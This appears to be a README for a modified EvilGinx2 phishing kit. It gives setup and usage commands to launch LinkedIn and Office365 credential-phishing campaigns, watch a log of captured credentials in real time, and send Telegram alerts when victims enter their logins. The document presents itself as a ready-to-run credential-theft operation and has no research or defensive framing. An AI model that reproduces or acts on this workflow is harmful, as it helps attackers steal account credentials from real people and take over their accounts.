# EvilGinx2-3.4.1-Modification 🚀

**Advanced Phishing Campaign Management System with Automated Telegram Integration**

---

## 📋 What This Project Does

This is a supercharged version of EvilGinx2 that automatically handles everything for you:
- ✅ **Auto-Setup**: One command installs and configures everything
- ✅ **Smart Campaigns**: Creates phishing pages and manages them automatically  
- ✅ **Real-Time Alerts**: Gets instant Telegram messages when someone enters credentials
- ✅ **24/7 Monitoring**: Runs continuously watching for captured data
- ✅ **Easy Management**: Web interface to control everything easily

---

## 🚀 Quick Start (3 Minutes to Live)

### 1. First-Time Setup
```bash
# Clone and setup everything automatically
git clone https://github.com/yourusername/EvilGinx2-3.4.1-Modification.git
cd EvilGinx2-3.4.1-Modification

# Run the magic setup script (does everything for you)
./scripts/setup.sh
```

### 2. Configure Your Settings
```bash
# Edit the config file with your details
nano manager/.env
```
*Fill in:*
- Your domain name
- Server IP address  
- Telegram bot token (get from @BotFather)
- Your chat ID

### 3. Start the System
```bash
# Start everything (runs in background)
./scripts/start.sh

# Check if it's working
./scripts/status.sh
```

---

## 📁 What's Where (Simple Guide)

```
EvilGinx2-3.4.1-Modification/
├── 📂 manager/                 # Brain of the operation (Python)
├── 📂 etc/evilginx/           # Configuration files
├── 📂 var/log/evilginx/       # Log files (check here if issues)
├── 📂 automation/             # Auto-backup and monitoring
├── 📂 scripts/                # One-click scripts
└── 📂 docs/                   # Help guides and tutorials
```

---

## 🎯 How to Use It

### Start a Phishing Campaign
```bash
# Create LinkedIn phishing campaign (10 fake login pages)
./scripts/create_campaign.sh linkedin 10

# Create Office365 campaign  
./scripts/create_campaign.sh office365 5
```

### Check What's Happening
```bash
# See captured credentials
tail -f var/log/evilginx/captures/credentials.log

# Check system status
./scripts/status.sh

# View all active campaigns
./scripts/list_campaigns.sh
```

### Stop Everything
```bash
# Stop all campaigns
./scripts/stop.sh

# Complete shutdown  
./scripts/shutdown.sh
```

---

## 🔧 Setup Your Telegram Bot (5 Minutes)

### 1. Create Telegram Bot
- Message `@BotFather` on Telegram
- Send `/newbot` and follow instructions
- **Save the bot token** (looks like `123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11`)

### 2. Get Your Chat ID
- Message your new bot
- Visit: `https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates`
- **Find your chat ID** in the response

### 3. Configure Alerts
```bash
# Edit config file
nano manager/.env

# Add these lines:
TELEGRAM_BOT_TOKEN=your_token_here
TELEGRAM_CHAT_ID=your_chat_id_here
```

---

## 🛠️ Maintenance Commands

```bash
# Backup everything (automatically runs daily)
./automation/backup/backup.sh

# Update the system
./scripts/update.sh

# Check security status
./security/audit/security_check.sh

# View system logs
tail -f var/log/evilginx/error/evilginx.error.log
```

---

## 🆘 Troubleshooting

### Common Issues:

**❌ "Port 443 in use"**
```bash
sudo kill $(sudo lsof -t -i:443)
./scripts/start.sh
```

**❌ "Telegram not working"**
- Check bot token and chat ID in `manager/.env`
- Ensure bot can send messages to you

**❌ "Phishlets not loading"**
```bash
# Reinstall phishlets
./scripts/setup_phishlets.sh
```

**❌ "Can't access dashboard"**
```bash
# Check firewall
sudo ufw allow 443
sudo ufw allow 80
```

---

## 📊 Monitoring Your Campaign

### Check Live Statistics
```bash
# See real-time captures
watch -n 5 'tail -n 10 var/log/evilginx/captures/credentials.log'

# Monitor server health
./telemetry/metrics/system_stats.sh
```

### View Web Dashboard
*(Coming in v2.0)* - Web interface to manage everything visually

---

## 🔒 Security Notes

- ✅ All credentials encrypted at rest
- ✅ Automatic daily backups  
- ✅ Firewall pre-configured
- ✅ No external dependencies required
- ✅ All traffic over HTTPS/SSL

---

## 📞 Support

### Quick Help
1. Check `docs/troubleshooting/COMMON_ISSUES.md`
2. View logs: `var/log/evilginx/error/evilginx.error.log`
3. Run diagnostic: `./scripts/diagnose.sh`

### Community Help
- 📖 Documentation: `docs/` folder
- 🐛 Issues: GitHub Issues page
- 💬 Discussions: GitHub Discussions

---

The system will:

- ✅ Automatically monitor for credentials 24/7
- ✅ Send instant Telegram alerts  
- ✅ Handle multiple campaigns simultaneously
- ✅ Backup itself daily
- ✅ Stay running through reboots

**Next Steps:**
1. Test with `./scripts/test_campaign.sh`
2. Join Telegram channel for updates
3. Read `docs/ADVANCED.md` for pro features

---

*Last updated: $(date +%Y-%m-%d) | Version: 3.4.1-mod | License: GPLv3*
